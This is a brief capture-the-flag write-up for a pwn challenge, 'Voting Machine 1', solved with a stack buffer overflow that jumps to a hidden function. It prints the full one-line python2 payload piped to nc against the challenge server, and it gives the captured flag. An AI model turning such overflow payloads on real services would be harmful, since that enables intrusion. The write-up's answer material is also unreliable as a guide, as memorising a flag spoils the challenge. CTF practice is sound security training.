[../](../../)

# Voting Machine 1

## pwn - Points: 33

> In a world with many uncertainties we need some kind of structure. Democracy is a big part of that, therefore we need voting machines! Well, at least if they are safe...
>
> nc 13.48.67.196 50000

## Solution

Overflow the buffer to redirect execution to the `super_secret_function`.

	python2 -c "print('A'*10+'\x07\x08\x40\x00\x00\x00\x00\x00')" | nc 13.48.67.196 50000

flag : `watevr{w3ll_th4t_w4s_pr3tty_tr1v1al_anyways_https://www.youtube.com/watch?v=Va4aF6rRdqU}`